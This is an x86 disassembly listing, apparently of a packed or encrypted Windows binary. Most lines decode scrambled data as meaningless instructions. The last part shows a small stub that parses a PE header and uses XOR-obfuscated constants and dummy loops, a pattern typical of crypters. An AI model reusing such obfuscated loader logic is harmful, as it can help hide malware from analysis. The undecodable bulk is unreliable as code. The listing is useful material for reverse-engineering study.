  417865:	or     BYTE PTR [edx],cl
  417867:	ds pop ecx
  417869:	ss push ecx
  41786b:	and    eax,0x381a0ede
  417870:	and    edx,DWORD PTR [edi+0x482fae61]
  417876:	mov    ecx,0x259dd254
  41787b:	jnp    0x41783f
  41787d:	out    0xd3,al
  41787f:	sub    esi,DWORD PTR [esi]
  417881:	add    DWORD PTR [esi+0x4ae47880],ebp
  417887:	les    edx,FWORD PTR [esi+edx*2+0x3f]
  41788b:	ret    
  41788c:	inc    esp
  41788d:	mov    ch,0x7f
  41788f:	ins    DWORD PTR es:[edi],dx
  417890:	mov    eax,0x3e3f6bb4
  417895:	out    0x95,eax
  417897:	rcl    BYTE PTR [eax*2+0x578d2fbb],1
  41789e:	pusha  
  41789f:	add    ecx,DWORD PTR [eax-0x80]
  4178a2:	and    ebx,eax
  4178a4:	les    eax,FWORD PTR [edi]
  4178a6:	push   ds
  4178a7:	outs   dx,BYTE PTR ds:[esi]
  4178a8:	or     bh,BYTE PTR [edx-0x76]
  4178ab:	fs leave 
  4178ad:	pop    eax
  4178ae:	jmp    0x8ed5:0x915332b7
  4178b5:	aam    0x23
  4178b7:	cmp    bh,BYTE PTR [ebp+0x982e199]
  4178bd:	fistp  WORD PTR [ecx+0xf]
  4178c0:	dec    eax
  4178c1:	outs   dx,BYTE PTR ds:[esi]
  4178c2:	js     0x4178b4
  4178c4:	rcl    BYTE PTR [ecx+0x2fee6cf8],1
  4178ca:	sar    ah,1
  4178cc:	in     eax,dx
  4178cd:	dec    ebp
  4178ce:	pop    eax
  4178cf:	sub    DWORD PTR [edx+eiz*8+0x17],edx
  4178d3:	or     BYTE PTR [edx+0x6c],0xa8
  4178d7:	push   ds
  4178d8:	(bad)  
  4178d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178da:	dec    esi
  4178db:	and    edi,DWORD PTR [edx]
  4178dd:	ret    0xad16
  4178e0:	xor    al,0xdb
  4178e2:	jnp    0x4178ed
  4178e4:	mov    edx,esi
  4178e6:	cdq    
  4178e7:	add    esp,ebx
  4178e9:	pusha  
  4178ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178eb:	rcl    DWORD PTR [ebx-0x3e],0x5a
  4178ef:	mov    ds,WORD PTR [eax+0x47dab9c1]
  4178f5:	out    0x45,eax
  4178f7:	mov    eax,0x80872db6
  4178fc:	cmp    BYTE PTR [edx+0x4b],bl
  4178ff:	nop
  417900:	jp     0x417909
  417902:	dec    edx
  417903:	jbe    0x41797a
  417905:	jo     0x41791e
  417907:	or     DWORD PTR ds:0x8a53abff,0xffffffdd
  41790e:	out    0xa0,al
  417910:	fsubp  st(6),st
  417912:	(bad)  
  417913:	push   esi
  417914:	sbb    DWORD PTR [esp+eax*1-0x61],esp
  417918:	cld    
  417919:	in     al,dx
  41791a:	jge    0x4178ae
  41791c:	mov    al,ds:0xabd3bd2a
  417921:	jmp    0x417928
  417923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417924:	or     al,0x27
  417926:	pop    esi
  417927:	push   es
  417928:	fst    QWORD PTR [ebx+0x68]
  41792b:	ret    0xcd3b
  41792e:	jns    0x41795c
  417930:	sub    eax,0xa3999dca
  417935:	jbe    0x417982
  417937:	push   cs
  417938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417939:	adc    BYTE PTR ds:0xef18014e,0x32
  417940:	dec    esp
  417941:	fld    DWORD PTR [ecx]
  417943:	pop    edi
  417944:	cmp    DWORD PTR [esp+ebp*1],edi
  417947:	xor    al,0x9f
  417949:	clc    
  41794a:	mov    al,ds:0x21c6d7e5
  41794f:	enter  0xe075,0x1d
  417953:	lock adc dl,BYTE PTR [ecx]
  417956:	xchg   edx,eax
  417957:	xchg   BYTE PTR [esi],ch
  417959:	sub    eax,0x7a3c7bd4
  41795e:	jmp    0x14a7c3dd
  417963:	int    0x0
  417965:	pop    ebp
  417966:	stos   DWORD PTR es:[edi],eax
  417967:	mov    bl,0x1f
  417969:	imul   edi,DWORD PTR [eax],0xffffffbd
  41796c:	mov    ah,0x49
  41796e:	(bad)  
  41796f:	and    BYTE PTR [eax+ecx*1-0x5a],al
  417973:	outs   dx,BYTE PTR fs:[esi]
  417975:	es mov ss,eax
  417978:	and    DWORD PTR [esi+0x75],edx
  41797b:	mov    ecx,0x591301c7
  417980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417981:	rol    BYTE PTR [ecx-0x4c538037],0xb
  417988:	jnp    0x417933
  41798a:	jge    0x417996
  41798c:	ror    BYTE PTR [edi-0x46],cl
  41798f:	sub    BYTE PTR [edx-0x24],0x1
  417993:	fwait
  417994:	cdq    
  417995:	loop   0x4179f3
  417997:	fs ret 
  417999:	dec    edx
  41799a:	dec    esp
  41799b:	outs   dx,BYTE PTR ds:[esi]
  41799c:	mov    al,ds:0x8128ba71
  4179a1:	jecxz  0x4179b4
  4179a3:	iret   
  4179a4:	xchg   edx,eax
  4179a5:	or     BYTE PTR ds:0x8bf77b15,al
  4179ab:	xchg   edi,eax
  4179ac:	adc    ecx,DWORD PTR [esi]
  4179ae:	xchg   edx,eax
  4179af:	adc    eax,0xeec8a256
  4179b4:	hlt    
  4179b5:	arpl   WORD PTR [esi+0x7d],dx
  4179b8:	js     0x417986
  4179ba:	lods   eax,DWORD PTR ds:[esi]
  4179bb:	xor    eax,DWORD PTR [edi]
  4179bd:	in     eax,0x44
  4179bf:	fnstsw WORD PTR [edx-0x5564b3c4]
  4179c5:	outs   dx,DWORD PTR ds:[esi]
  4179c6:	sbb    DWORD PTR [esi+0x71a5f0a9],ecx
  4179cc:	sbb    eax,DWORD PTR [edi+0x18]
  4179cf:	mov    esp,0x25a932c2
  4179d4:	add    BYTE PTR [esi-0x7f],dl
  4179d7:	add    DWORD PTR [ecx],edi
  4179d9:	jbe    0x417a45
  4179db:	dec    edx
  4179dd:	dec    edi
  4179de:	das    
  4179df:	inc    esi
  4179e0:	or     BYTE PTR [ecx],ch
  4179e2:	mov    ss,WORD PTR [ebx]
  4179e4:	jge    0x4179ab
  4179e6:	or     DWORD PTR [ecx-0x58],0x9b41f4a9
  4179ed:	xor    al,0xc6
  4179ef:	stos   DWORD PTR es:[edi],eax
  4179f0:	sub    eax,0x86b16771
  4179f5:	push   eax
  4179f6:	ret    
  4179f7:	aad    0x92
  4179f9:	lahf   
  4179fa:	out    dx,al
  4179fb:	iret   
  4179fc:	mov    esp,0x6ca9eea1
  417a01:	jmp    0x975baed5
  417a06:	arpl   WORD PTR [edx+0x23688cb1],ax
  417a0c:	retf   0xfce6
  417a0f:	xor    eax,0x5128d36b
  417a14:	das    
  417a15:	bound  ebx,QWORD PTR [eax]
  417a17:	hlt    
  417a18:	xchg   ebp,eax
  417a19:	xor    BYTE PTR [ecx-0x4c],ch
  417a1c:	cmova  ebp,DWORD PTR [esi]
  417a1f:	sbb    al,0xd6
  417a21:	aad    0x60
  417a23:	repz dec ecx
  417a25:	jb     0x4179b5
  417a27:	bound  edx,QWORD PTR [ebx]
  417a29:	add    DWORD PTR [ecx+0x30b4e1fe],0x7677c1bb
  417a33:	and    eax,0xdadd9460
  417a38:	mov    al,0x30
  417a3a:	pusha  
  417a3b:	test   DWORD PTR [ebx+eiz*1-0x53869105],ecx
  417a42:	sub    ah,bl
  417a44:	scas   eax,DWORD PTR es:[edi]
  417a45:	in     al,dx
  417a46:	mov    bl,0xc6
  417a48:	fs test al,ch
  417a4b:	sti    
  417a4c:	jbe    0x417abf
  417a4e:	int3   
  417a4f:	cvtpi2ps xmm7,QWORD PTR [edi]
  417a52:	adc    BYTE PTR [edx+0x18922502],ah
  417a58:	repnz push ebx
  417a5a:	or     edx,esi
  417a5c:	mov    BYTE PTR [ecx-0x5b0f3bd8],al
  417a62:	stc    
  417a63:	inc    esi
  417a64:	sbb    DWORD PTR [ecx+0xc96f3c1],ecx
  417a6a:	fs adc al,0xa1
  417a6d:	mov    dh,0x3
  417a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a70:	retf   
  417a71:	lahf   
  417a72:	pop    ebx
  417a73:	inc    esi
  417a74:	jp     0x417a73
  417a76:	push   ecx
  417a77:	add    cl,BYTE PTR [edx]
  417a79:	(bad)  
  417a7a:	(bad)  
  417a7b:	sar    esi,cl
  417a7d:	sti    
  417a7e:	pop    ds
  417a7f:	jne    0x417a47
  417a81:	sub    BYTE PTR [ebx],dl
  417a83:	add    BYTE PTR gs:[ecx+0x47],al
  417a87:	mov    eax,ds:0xeda8245b
  417a8c:	cwde   
  417a8d:	or     bl,BYTE PTR [ebx]
  417a8f:	leave  
  417a90:	pop    ebp
  417a91:	push   0x43069c96
  417a96:	loopne 0x417ad1
  417a98:	sub    BYTE PTR [ebp+0x33a97d28],bl
  417a9e:	mov    dl,0x13
  417aa0:	mov    ds:0x2ef37d40,eax
  417aa5:	sub    eax,0xf6166de9
  417aaa:	not    DWORD PTR [esi]
  417aac:	popa   
  417aad:	dec    eax
  417aae:	sbb    eax,0x66010f42
  417ab3:	mov    ds:0x7d45680c,eax
  417ab8:	stc    
  417ab9:	or     dl,BYTE PTR ss:[ebx-0x7a]
  417abd:	pop    ds
  417abe:	(bad)  
  417abf:	add    eax,0xff347180
  417ac4:	inc    ebx
  417ac5:	mov    edi,0x94a6e424
  417aca:	(bad)  
  417acb:	gs inc esp
  417acd:	arpl   WORD PTR [edx+0x64],sp
  417ad0:	mov    dl,0xf6
  417ad2:	imul   ecx,DWORD PTR [edi],0xffffffe6
  417ad5:	call   0x3072e185
  417ada:	xchg   edx,eax
  417adb:	call   0x7eb8361d
  417ae0:	repnz inc esp
  417ae2:	xchg   ecx,eax
  417ae3:	inc    ebp
  417ae4:	rcl    DWORD PTR [ecx],cl
  417ae6:	pop    ds
  417ae7:	loope  0x417ad3
  417ae9:	out    dx,al
  417aea:	test   ah,al
  417aec:	out    0x44,eax
  417aee:	push   ds
  417aef:	jnp    0x417ac7
  417af1:	adc    ch,BYTE PTR [ecx-0x785241e5]
  417af7:	xchg   ebp,eax
  417af8:	in     al,dx
  417af9:	pusha  
  417afa:	scas   al,BYTE PTR es:[edi]
  417afb:	int3   
  417afc:	jbe    0x417b0f
  417afe:	shl    edi,cl
  417b00:	xor    edi,DWORD PTR [esi-0x73]
  417b03:	push   0xdca8847c
  417b08:	adc    al,0xfb
  417b0a:	(bad)  
  417b0b:	add    al,0x24
  417b0d:	ret    
  417b0e:	push   ecx
  417b0f:	dec    ecx
  417b10:	or     ebx,ecx
  417b12:	fwait
  417b13:	inc    ebx
  417b14:	xchg   esp,eax
  417b15:	sub    BYTE PTR es:[eax-0x24],bh
  417b19:	pop    ecx
  417b1a:	pop    es
  417b1b:	sar    BYTE PTR [esi],0xeb
  417b1e:	test   eax,0x852949cd
  417b23:	dec    edi
  417b24:	(bad)  
  417b26:	cmp    bl,BYTE PTR [ebx+0x2a]
  417b29:	cs (bad) 
  417b2b:	leave  
  417b2c:	and    ah,bl
  417b2e:	adc    cl,BYTE PTR [ecx+0x4f]
  417b31:	xor    dh,al
  417b33:	adc    eax,eax
  417b35:	push   eax
  417b36:	mul    DWORD PTR [ebp+edx*1-0x20]
  417b3a:	xor    esi,DWORD PTR [ecx-0x5c]
  417b3d:	pop    edx
  417b3e:	xchg   edi,eax
  417b3f:	aas    
  417b40:	daa    
  417b41:	icebp  
  417b42:	xchg   edx,eax
  417b43:	dec    esi
  417b44:	fisubr DWORD PTR [esi-0x5f4c7e73]
  417b4a:	sbb    DWORD PTR [edi-0x80],0xf9e6d06c
  417b51:	mov    ebx,esi
  417b53:	int3   
  417b54:	jl     0x417b85
  417b56:	xchg   BYTE PTR [ebp+0x4d067494],dh
  417b5c:	leave  
  417b5d:	push   ebp
  417b5e:	mov    bl,0xbf
  417b60:	fwait
  417b61:	(bad)  
  417b62:	xchg   ebp,eax
  417b63:	shl    BYTE PTR [ebp-0x1734740c],cl
  417b69:	in     al,dx
  417b6a:	jmp    0x6988d99e
  417b6f:	sub    eax,0x3151f692
  417b74:	out    dx,al
  417b75:	adc    al,0x68
  417b77:	icebp  
  417b78:	shrd   DWORD PTR [edi-0x62607f1c],esi,0x55
  417b80:	mov    edx,0x6d27903c
  417b85:	jp     0x417b1f
  417b87:	sbb    BYTE PTR [ebp-0x2ff4678d],dl
  417b8d:	adc    al,0x7f
  417b8f:	dec    edi
  417b90:	fstp   DWORD PTR [ebx]
  417b92:	jp     0x417b8f
  417b94:	adc    ch,BYTE PTR [ebx-0x3b3f8736]
  417b9a:	aam    0x7c
  417b9c:	lods   eax,DWORD PTR ds:[esi]
  417b9d:	add    dh,al
  417b9f:	out    0xc7,al
  417ba1:	push   esi
  417ba2:	cmp    eax,0x3f13f640
  417ba7:	mov    edx,0x9072e536
  417bac:	data16 xor al,ch
  417baf:	imul   eax,DWORD PTR [edi+ebp*8+0x34],0xcebb7720
  417bb7:	adc    al,0xf6
  417bb9:	dec    eax
  417bba:	lock pop ss
  417bbc:	aas    
  417bbd:	aad    0xeb
  417bbf:	int3   
  417bc0:	addr16 sbb eax,0xee265919
  417bc6:	or     dh,BYTE PTR [edx-0x21c00238]
  417bcc:	xor    esi,DWORD PTR [esi+0xe]
  417bcf:	test   ebp,eax
  417bd1:	(bad)  
  417bd2:	iret   
  417bd3:	sub    cl,dl
  417bd5:	mov    al,ds:0x5b672bee
  417bda:	cmc    
  417bdb:	test   BYTE PTR [edx-0x52],dh
  417bde:	in     al,0x7c
  417be0:	arpl   WORD PTR [edx+0x20f3b524],cx
  417be6:	mov    edi,0x22e50df9
  417beb:	repz pop ds
  417bed:	mov    ah,0x1a
  417bef:	out    0x28,eax
  417bf1:	jmp    0x72b6930
  417bf6:	addr16 in eax,dx
  417bf8:	dec    edx
  417bf9:	cmp    cl,BYTE PTR [ebx]
  417bfb:	dec    eax
  417bfc:	xchg   DWORD PTR [edi],ebp
  417bfe:	adc    esi,edx
  417c00:	or     eax,0xaedfa052
  417c05:	and    DWORD PTR [esi],esi
  417c07:	jmp    0x417bab
  417c09:	js     0x417ba3
  417c0b:	sub    al,0x35
  417c0d:	mov    cl,0x77
  417c0f:	dec    edx
  417c10:	std    
  417c11:	cmp    BYTE PTR [esi+0x6a7ed70f],0x39
  417c18:	or     esp,DWORD PTR [edi]
  417c1a:	daa    
  417c1b:	xor    ebx,ebp
  417c1d:	pop    ebx
  417c1e:	jns    0x417c45
  417c20:	inc    edi
  417c21:	in     al,dx
  417c22:	fs ds push ds
  417c25:	vpsllq xmm4,xmm1,XMMWORD PTR [esi]
  417c29:	shl    DWORD PTR [ebx+0x29ce0ab7],0x61
  417c30:	les    edi,FWORD PTR [eax]
  417c32:	xor    ebp,DWORD PTR [esi]
  417c34:	lods   al,BYTE PTR ds:[esi]
  417c35:	inc    esp
  417c36:	add    ch,BYTE PTR ds:0xf1feacc0
  417c3c:	pop    ss
  417c3d:	add    bl,BYTE PTR [ebx+0x65]
  417c40:	mov    ah,0xc4
  417c42:	xor    al,0x76
  417c44:	lahf   
  417c45:	xchg   ebx,eax
  417c46:	and    ebp,0xffffff94
  417c49:	dec    esp
  417c4a:	sub    al,0xc
  417c4c:	push   edx
  417c4d:	fs pop eax
  417c4f:	shr    DWORD PTR [ebx+0x4393155d],cl
  417c55:	in     eax,dx
  417c56:	add    DWORD PTR [ebx-0x4f],eax
  417c59:	sbb    edi,DWORD PTR ss:[edi+0x3f]
  417c5d:	jecxz  0x417c57
  417c5f:	out    dx,al
  417c60:	dec    edx
  417c61:	je     0x417cd5
  417c63:	jno    0x417c41
  417c65:	mov    eax,0x94747a5
  417c6a:	mov    BYTE PTR [eax+0x5],al
  417c6d:	mov    edx,0xc7d1d520
  417c72:	inc    edx
  417c73:	je     0x417bf7
  417c75:	add    eax,0x3723978d
  417c7a:	mov    ?,WORD PTR [eax+0x5a6a8dc3]
  417c80:	sahf   
  417c81:	push   0xe548ddcf
  417c86:	or     eax,0x88f8e6c2
  417c8b:	inc    eax
  417c8d:	out    dx,al
  417c8e:	hlt    
  417c8f:	jb     0x417c80
  417c91:	pusha  
  417c92:	pushf  
  417c93:	sbb    eax,0x1847b342
  417c98:	adc    bl,ah
  417c9a:	dec    eax
  417c9b:	mov    ds:0x9714e2a8,al
  417ca0:	pop    ds
  417ca1:	out    0xb3,al
  417ca3:	push   es
  417ca4:	cmp    eax,DWORD PTR [esi]
  417ca6:	inc    esi
  417ca7:	out    0xdf,al
  417ca9:	cmp    al,0x2a
  417cab:	and    cl,BYTE PTR [ecx]
  417cad:	cmp    eax,0x72a2a549
  417cb2:	and    ch,BYTE PTR [ebx+0x50]
  417cb5:	dec    ecx
  417cb6:	cvtdq2ps xmm7,XMMWORD PTR [edx]
  417cb9:	cli    
  417cba:	shl    BYTE PTR [ebp-0x51],1
  417cbd:	mov    al,ds:0x7a2cb39c
  417cc2:	or     BYTE PTR [edx-0x6276dee4],dh
  417cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cc9:	pop    esp
  417cca:	loope  0x417c66
  417ccc:	sub    esi,DWORD PTR [ebp-0x4]
  417ccf:	and    ch,bh
  417cd1:	lods   al,BYTE PTR ds:[esi]
  417cd2:	sbb    al,0xdf
  417cd4:	cmp    bh,BYTE PTR [edx+0x77]
  417cd7:	add    al,0x86
  417cda:	inc    esi
  417cdb:	inc    eax
  417cdc:	dec    ecx
  417cdd:	aas    
  417cde:	push   cs
  417cdf:	jecxz  0x417c88
  417ce1:	xchg   edx,eax
  417ce2:	adc    eax,0x58669ee
  417ce7:	and    BYTE PTR [edx+0x542db4e1],ch
  417ced:	test   al,0xcd
  417cef:	dec    edi
  417cf0:	das    
  417cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cf2:	or     al,0x4a
  417cf4:	bnd ret 
  417cf6:	add    al,0x57
  417cf8:	mov    eax,0xd2ca3f2f
  417cfd:	push   ebp
  417cfe:	dec    esi
  417cff:	mov    bh,0x6c
  417d01:	outs   dx,BYTE PTR ds:[esi]
  417d03:	js     0x417d62
  417d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d06:	stos   DWORD PTR es:[edi],eax
  417d07:	arpl   WORD PTR [ecx],ax
  417d09:	cld    
  417d0a:	(bad)  
  417d0b:	mov    esi,0x522e6166
  417d10:	mov    cl,0x1e
  417d12:	sub    al,0xfb
  417d14:	mov    ecx,0x60b3536f
  417d19:	retf   
  417d1a:	div    BYTE PTR [ecx]
  417d1c:	mov    ch,cl
  417d1e:	loope  0x417d94
  417d20:	sub    al,0x64
  417d22:	mov    edx,0x398b6ee3
  417d27:	cmp    DWORD PTR [ebp-0x6],edi
  417d2a:	push   ss
  417d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2c:	dec    edi
  417d2d:	push   cs
  417d2e:	mov    al,ds:0x45427f0a
  417d33:	ins    DWORD PTR es:[edi],dx
  417d34:	cmp    dh,ch
  417d36:	cdq    
  417d37:	mov    ch,0xbc
  417d39:	mov    ah,BYTE PTR [esp+edi*4]
  417d3c:	repz sub ah,BYTE PTR [ebp+0x4212fa93]
  417d43:	and    ecx,DWORD PTR [di-0x7c]
  417d47:	lahf   
  417d48:	push   cs
  417d49:	aad    0x24
  417d4b:	je     0x417d03
  417d4d:	stos   DWORD PTR es:[edi],eax
  417d4e:	mov    dh,0x1
  417d50:	push   eax
  417d51:	in     eax,dx
  417d52:	push   ebx
  417d53:	xor    esi,DWORD PTR [eax+0x11]
  417d56:	test   eax,0x6b835244
  417d5b:	shl    BYTE PTR ds:0x5723aaa1,0x22
  417d62:	out    dx,eax
  417d63:	pop    ds
  417d64:	jo     0x417cfa
  417d66:	jmp    0x417d1b
  417d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d69:	xchg   edx,eax
  417d6a:	lds    esi,FWORD PTR [edi+0x34349cd3]
  417d70:	jo     0x417d22
  417d72:	ror    BYTE PTR [esi],1
  417d74:	addr16 aas 
  417d76:	and    dh,BYTE PTR [eax]
  417d78:	sub    eax,0x4e2c90d
  417d7d:	cmp    ebx,DWORD PTR [esi]
  417d7f:	adc    BYTE PTR ds:0x25effcd8,0xcd
  417d86:	(bad)  
  417d87:	push   cs
  417d88:	cmp    ah,BYTE PTR [ecx-0x48]
  417d8b:	or     edi,ebx
  417d8d:	jb     0x417d36
  417d8f:	jge    0x417d6b
  417d91:	aaa    
  417d92:	jno    0x417d32
  417d94:	xor    al,0x38
  417d96:	push   esp
  417d97:	lods   al,BYTE PTR ds:[esi]
  417d98:	push   esi
  417d99:	test   eax,0xbd1d2633
  417d9e:	jmp    0x417d28
  417da0:	push   ds
  417da1:	pop    ebx
  417da2:	add    esp,DWORD PTR [ebp+0x1e]
  417da5:	jl     0x417d52
  417da7:	dec    eax
  417da8:	or     BYTE PTR [eax-0x6a],bl
  417dab:	out    0x1c,eax
  417dad:	dec    edx
  417dae:	cmc    
  417daf:	add    edi,esp
  417db1:	or     al,0xb9
  417db3:	je     0x417dc4
  417db5:	inc    edx
  417db6:	add    bh,BYTE PTR [ecx-0x4f3a708b]
  417dbc:	lods   al,BYTE PTR ds:[esi]
  417dbd:	dec    ecx
  417dbe:	xchg   esi,eax
  417dbf:	pop    ds
  417dc0:	loope  0x417d80
  417dc2:	imul   eax,DWORD PTR ds:0x53e1226a,0x48
  417dc9:	jge    0x417da8
  417dcb:	cmp    al,0x97
  417dcd:	arpl   WORD PTR [ebx+esi*4-0x4],bp
  417dd1:	mov    dh,0x6f
  417dd3:	push   0xffffff85
  417dd5:	add    BYTE PTR [edi],cl
  417dd7:	sub    edi,DWORD PTR [eax]
  417dd9:	mov    BYTE PTR es:[edi],ah
  417ddc:	into   
  417ddd:	inc    esp
  417dde:	adc    DWORD PTR [esi-0x1682b4c7],0x1b
  417de5:	call   0x9b4be98
  417dea:	xchg   ecx,eax
  417deb:	or     edx,DWORD PTR [ebx+0x5]
  417dee:	jns    0x417d86
  417df0:	fs inc edi
  417df2:	into   
  417df3:	inc    edi
  417df4:	jp     0x417d7b
  417df6:	sbb    bl,0xc6
  417df9:	mov    ebx,0x3d6d9af0
  417dfe:	mov    ds:0x4e3b586c,al
  417e03:	or     DWORD PTR [ebx*1+0x78d10b02],0xffffffe3
  417e0b:	xchg   esp,eax
  417e0c:	mov    cl,0x49
  417e0e:	fwait
  417e0f:	add    al,0x6c
  417e11:	jbe    0x417dc7
  417e13:	dec    ebx
  417e14:	mov    dh,BYTE PTR [edx-0x4d]
  417e17:	dec    ecx
  417e18:	sahf   
  417e19:	enter  0x709b,0x14
  417e1d:	hlt    
  417e1e:	cmc    
  417e1f:	int    0xd6
  417e21:	cld    
  417e22:	fistp  DWORD PTR [edi+0x7b]
  417e25:	mov    cl,0x53
  417e27:	cmp    al,0xfb
  417e29:	xchg   ecx,eax
  417e2a:	pop    esp
  417e2b:	out    0xd5,al
  417e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e2e:	dec    ecx
  417e2f:	popa   
  417e30:	inc    esp
  417e31:	xor    al,0x6c
  417e33:	xor    edx,DWORD PTR [edx]
  417e35:	mov    bh,0x53
  417e37:	int    0xfc
  417e39:	in     eax,0x37
  417e3b:	add    al,0x3d
  417e3d:	push   0xffffff8c
  417e3f:	xchg   edi,eax
  417e40:	and    eax,0x8f0a75e1
  417e45:	cmc    
  417e46:	cs repnz push 0x18
  417e4a:	jo     0x417dd1
  417e4c:	sbb    ch,BYTE PTR [edx+0x1391ef6d]
  417e52:	dec    ebp
  417e53:	imul   ecx,DWORD PTR [edx+0xf],0xffffffe1
  417e57:	cli    
  417e58:	call   0x1a2ee070
  417e5d:	xlat   BYTE PTR ds:[ebx]
  417e5e:	fmul   st,st(6)
  417e60:	test   eax,0x8f88701
  417e65:	jne    0x417e53
  417e67:	into   
  417e68:	xchg   edx,eax
  417e69:	push   0xffffffb1
  417e6b:	add    ch,dh
  417e6d:	mov    ds:0x6eddb7f5,al
  417e72:	(bad)  
  417e73:	push   0xcffffdfb
  417e78:	xor    BYTE PTR ds:0xc747607f,cl
  417e7e:	leave  
  417e7f:	jno    0x417e41
  417e81:	dec    ebx
  417e82:	imul   esp,DWORD PTR [ecx+0x6ccbac53],0xa896e618
  417e8c:	sar    BYTE PTR [ebx],0x6a
  417e8f:	repz mov bl,0x1d
  417e92:	inc    edi
  417e93:	dec    esi
  417e94:	push   ecx
  417e95:	in     eax,0xf4
  417e97:	push   esp
  417e98:	cs ins BYTE PTR es:[edi],dx
  417e9a:	jmp    0xcaeb608d
  417e9f:	ds xchg esi,eax
  417ea1:	in     al,dx
  417ea2:	scas   eax,DWORD PTR es:[edi]
  417ea3:	mov    dh,0xe7
  417ea5:	pop    ebx
  417ea6:	scas   al,BYTE PTR es:[edi]
  417ea7:	cwde   
  417ea8:	jno    0x417ec0
  417eaa:	pop    ebx
  417eab:	xchg   esi,eax
  417eac:	je     0x417e73
  417eae:	out    0x6a,al
  417eb0:	pop    ds
  417eb1:	out    0x13,al
  417eb3:	ret    0x32d1
  417eb6:	xchg   esp,eax
  417eb7:	pop    ss
  417eb8:	pop    ebp
  417eb9:	add    BYTE PTR ds:0xc33c6f70,bl
  417ebf:	add    ebp,DWORD PTR [ebx+0x2f]
  417ec2:	add    eax,0x897ac475
  417ec7:	inc    ebx
  417ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ec9:	imul   ebx,eax,0x43c0ef08
  417ecf:	imul   edi,DWORD PTR [esi+0x48],0xfffffffa
  417ed3:	mov    BYTE PTR [esi-0x2d3bb0b1],dl
  417ed9:	mov    ch,0x51
  417edb:	add    ebp,DWORD PTR [edx]
  417edd:	test   esp,0x420e7e53
  417ee3:	and    eax,0x5035a8d3
  417ee8:	sbb    al,0x2f
  417eea:	mov    bl,0x6f
  417eec:	jo     0x417f2d
  417eee:	xor    bl,BYTE PTR [ebx]
  417ef0:	pop    ds
  417ef1:	inc    esi
  417ef2:	retf   
  417ef3:	test   DWORD PTR [ecx+0xac4a3ad],esp
  417ef9:	push   es
  417efa:	imul   edi,DWORD PTR [esp+esi*8+0x77c629a5],0x92bca78e
  417f05:	cmp    al,0x39
  417f07:	ins    DWORD PTR es:[edi],dx
  417f08:	mov    WORD PTR [ecx+0x3a],cs
  417f0b:	mov    bh,0xf8
  417f0d:	sbb    dl,BYTE PTR [edx]
  417f0f:	and    DWORD PTR [eax+edx*4+0x10a60a9d],ebx
  417f16:	imul   edx,DWORD PTR [ebx],0x803e25cd
  417f1c:	rcr    DWORD PTR [ecx+0x2bc93b5d],cl
  417f22:	mov    ebx,0x81008a39
  417f27:	add    eax,0x429004
  417f2c:	dec    esi
  417f2d:	and    al,0x0
  417f2f:	add    BYTE PTR [ecx*1-0x6febca7f],al
  417f36:	inc    edx
  417f37:	add    BYTE PTR [eax+eiz*2],cl
  417f3a:	inc    edx
  417f3b:	add    BYTE PTR [edi+ebp*2],dh
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42004b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1dc
  41805a:	sub    ecx,edx
